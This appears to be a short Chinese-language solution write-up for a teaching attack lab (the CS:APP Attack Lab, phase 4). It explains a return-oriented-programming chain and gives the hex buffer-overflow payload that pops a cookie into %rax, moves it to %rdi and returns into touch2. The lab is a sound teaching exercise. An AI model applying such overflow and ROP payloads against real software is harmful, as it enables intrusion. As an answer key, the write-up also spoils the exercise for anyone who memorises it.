***思路***

1. 把 `cookie` 传递给 `%rdi`，最好的方式是 `pop`。把 `cookie` 写到栈里，`pop` 出来就可以。
2. 发现只能 `pop` 到 `rax`，无妨，再加一条 `mov` 即可

***代码***
```x86asm
/*
00000000004019a7 <addval_219>:
  4019a7:       8d 87 51 73 58 90       // pop %rax
  4019ad:       c3                      ret
00000000004019a0 <addval_273>:
  4019a0:       8d 87 48 89 c7 c3       // mov %rax,%rdi

  0x4017ec                              // touch2 地址
  0x59b997fa                            // cookie 值
*/

00 00 00 00 00
00 00 00 00 00 
00 00 00 00 00 
00 00 00 00 00 
00 00 00 00 00 
00 00 00 00 00 
00 00 00 00 00 
00 00 00 00 00
// 下面这一行覆盖 ret 目的地址，变成 pop
ab 19 40 00 00 00 00 00
// 要 pop 进 %rax 的数据 (cookie值)
fa 97 b9 59 00 00 00 00
// 覆盖第一条 gadget 的 ret 目的地址，变成 mov
a2 19 40 00 00 00 00 00
// 覆盖第二条 gadget 的 ret 地址，变成 touch2
ec 17 40 00 00 00 00 00
```
